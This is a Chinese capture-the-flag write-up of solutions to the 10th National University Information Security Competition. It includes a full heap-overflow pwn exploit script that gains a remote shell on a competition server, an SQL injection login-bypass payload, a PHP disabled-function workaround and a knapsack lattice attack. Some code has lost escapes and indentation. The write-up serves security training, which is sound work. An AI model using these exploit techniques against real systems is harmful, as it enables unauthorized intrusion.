# 【CTF 攻略】第十届全国大学生信息安全竞赛writeup
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
****
作者：[ **FlappyPig**](http://bobao.360.cn/member/contribute?uid=1184812799)
预估稿费：600RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**1.PHP execise 类型：WEB 分值：150分**
直接就能执行代码，先执行phpinfo(),发现禁用了如下函数
    assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,file,readfile,opendir,readdir,closedir,rewinddir,
然后通过
    foreach (glob("./*") as $filename) {  echo $filename.""; }
列出当前目录，然后再用highlight_file()函数读取flag文件内容即可 ##web 250
首先通过svn泄露获取到源码，然后观察发现主要部分在login.php这里
     11){
        echo("");
      }else{
        $sql = "select count(*) from t_info where username = '$name' or nickname = '$name'";
        echo $sql;
        $result = mysql_query($sql);
        $row = mysql_fetch_array($result);
        if ($row[0]){
          $_SESSION['hat'] = 'black';
          echo 'good job';
        }else{
        $_SESSION['hat'] = 'green';
        }
        header("Location: index.php");
      }
    }
当$_SESSION['hat'] = 'black';时，在index.php下面就能获取到flag，
但是我们注册时候插入的表是t_user，而这里登陆查询的表是t_info,所以思路就只有想办法在login这里注入， 最后构造的payload如下：
    name=or%0a1=1%0a#'&submit=check
成功获取到flag为flag{good_job_white_hat}
**2.填数游戏 类型：REVERSE 分值：200分**
逆向一看就是个数独游戏，主要就是把原来的9*9找出来
里面有一块初始化数独，那个地方看出来是
他的数独题目就如下一样，然后找个网站解一下，
然后输入时候把存在的项变成0就行
**3.easyheap 类型：PWN 分值：200分**
在edit的时候可以堆溢出，因为堆中有指针，因此只要覆盖指针即可任意地址读写。
因为开启了PIE，可以通过覆盖指针的最低字节进行泄露。
    from threading import Thread
    from zio import *
    target = './easyheap'
    target = ('120.132.66.76', 20010)
    def interact(io):
        def run_recv():
            while True:
                try:
                    output = io.read_until_timeout(timeout=1)
                    # print output
                except:
                    return
        t1 = Thread(target=run_recv)
        t1.start()
        while True:
            d = raw_input()
            if d != '':
                io.writeline(d)
    def create_note(io, size, content):
        io.read_until('Choice:')
        io.writeline('1')
        io.read_until(':')
        io.writeline(str(size))
        io.read_until(':')
        io.writeline(content)
    def edit_note(io, id, size, content):
        io.read_until('Choice:')
        io.writeline('2')
        io.read_until(':')
        io.writeline(str(id))
        io.read_until(':')
        io.writeline(str(size))
        io.read_until(':')
        io.write(content)
    def list_note(io):
        io.read_until('Choice:')
        io.writeline('3')
    def remove_note(io, id):
        io.read_until('Choice:')
        io.writeline('4')
        io.read_until(':')
        io.writeline(str(id))
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #0
        create_note(io, 0xa0, 'b'*0x90) #1
        create_note(io, 0xa0, 'c'*0x90) #2
        create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #3
        remove_note(io, 2)
        edit_note(io, 0, 0xb9, 'a'*0xb0+l64(0xa0)+'xd0')
        list_note(io)
        io.read_until('id:1,size:160,content:')
        leak_value = l64(io.readline()[:-1].ljust(8, 'x00'))
        base = leak_value - 0x3c4b78
        system = base + 0x0000000000045390
        free_hook = base + 0x00000000003C67A8
        edit_note(io, 0, 0xc0, 'a'*0xb0+l64(0xa0)+l64(free_hook))
        edit_note(io, 1, 8, l64(system))
        print hex(system)
        print hex(free_hook)
        remove_note(io, 3)
        interact(io)
    exp(target)
**4.传感器1 类型：MISC 分值：100分**
差分曼彻斯特
    from Crypto.Util.number import *
    id1 = 0x8893CA58
    msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556
    msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656
    print hex(msg1 ^ msg2).upper()
    s = bin(msg2)[6:]
    print s
    r=""
    tmp = 0
    for i in xrange(len(s)/2):
    c = s[i*2]
    if c == s[i*2 - 1]:
    r += '1'
    else:
    r += '0'
    print hex(int(r,2)).upper()
**5.apk crack 类型：REVERSE 分值：300分**
本题的做法比较取巧，首先使用jeb2打开apk文件，查看验证的关键流程
可以看到，程序在取得了用户输入的字符串后，会调用wick.show方法，这个方法会调用jni中的对应函数，该jni函数会开启反调试并给静态变量A、B赋值success和failed。随后会进入simple.check方法开启验证。
这个验证函数非常长，笔者也没看懂。Simple类中有两个字节数组，一个用于存储输入，把它命名为input；另一个数组初始为空，把它命名为empty。
使用jeb2的动态调试功能，把断点下到00000A7A函数的返回指令处，在手机中输入随意字符并点击确定，程序会断在返回指令处。
此时查看empty数组的值，发现疑似ASCII码的数字，转换过来就是flag
flag：clo5er
**  
**
**6.warmup 类型： **MISC** 分值：100分**
看到一个莫名其妙的文件open_forum.png，猜测是已知明文，后来google搞不到原图，官方的hint
猜测是盲水印
    python27 bwm.py decode fuli.png fuli2.png res.png
**7.wanna to see your hat 类型：web 分值：250分**
1、 利用.svn泄漏源码
2、 login.php根据select查询结果，$_SESSION[hat]获得不同的值。此处存在SQL注入漏洞
由index.php中代码可知，在$_SESSION[hat]不为green时候，输出flag。
结合login.php分析可知，在login.php中，第5行，但会结果不为空，即可。
因此构造poc
**8.Classical 类型：web 分值：300分**
题目类似WCTF某原题。
加密代码生成了超递增的sk后，使用sk * mask % N作为pk进行使用。flag被用于选取pk求和得到sum。
是典型的Knapsack problem，使用Shamir Attack进行攻击。在github上有很多此类加密方案的攻击办法：
攻击方法为首先构造矩阵，通过lllattack求得新的矩阵，选取最短的向量即可。
    c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569
    pubkey=[（自己去复制吧）]
    from Crypto.Util.number import long_to_bytes as l2b
    def create_matrix(pub, c):
        n = len(pub)
        i = matrix.identity(n) * 2
        last_col = [-1] * n
        first_row = []
        for p in pub:
            first_row.append(int(long(p)))
        first_row.append(-c)
        m = matrix(ZZ, 1, n+1, first_row)
        bottom = i.augment(matrix(ZZ, n, 1, last_col))
        m = m.stack(bottom)
        return m
    def is_target_value(V):
        for v in V:
            if v!=-1 and v!=1:
                return False
        return True
    def find_shortest_vector(matrix):
        for col in matrix.columns():
            if col[0] == 0 and is_target_value(col[1:]):
                return col
            else:
                continue
    pub = pubkey
    c = c
    m = create_matrix(pub, c)
    lllm = m.transpose().LLL().transpose()
    shortest_vector = find_shortest_vector(lllm)